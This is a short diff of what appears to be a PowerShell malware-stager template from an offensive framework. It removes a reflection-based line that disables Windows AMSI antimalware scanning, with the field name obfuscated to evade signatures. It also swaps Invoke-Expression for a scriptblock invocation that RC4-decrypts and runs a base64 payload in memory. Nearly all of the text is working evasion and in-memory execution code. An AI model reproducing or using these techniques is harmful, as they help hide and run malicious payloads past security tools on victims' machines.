@@ -1,5 +1,3 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsi%{random_string}Failed'.replace('%{random_string}','Init'),'NonPublic,Static').SetValue($null,$true)
-
 function %{func_rc4_decrypt} {
     param([Byte[]]$%{var_rc4buffer})
 
@@ -38,5 +36,5 @@ function %{func_rc4_decrypt} {
     $%{var_rc4buffer}
 }
 
-Invoke-Expression ([system.Text.Encoding]::UTF8).GetString((%{func_rc4_decrypt} ([System.Convert]::FromBase64String("%{b64payload}"))))
+&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((%{func_rc4_decrypt} ([System.Convert]::FromBase64String("%{b64payload}"))))))
 
